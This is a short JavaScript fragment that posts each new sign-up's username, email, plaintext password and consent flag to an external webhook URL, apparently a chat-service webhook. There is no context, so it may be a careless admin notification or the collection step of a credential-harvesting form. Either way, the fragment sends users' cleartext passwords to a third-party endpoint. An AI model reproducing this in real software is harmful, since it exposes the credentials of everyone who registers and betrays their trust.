await axios.post(WEBHOOK_URL, {
  content: `New sign up:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}\nConsent: ${consent ? "Yes" : "No"}`
});
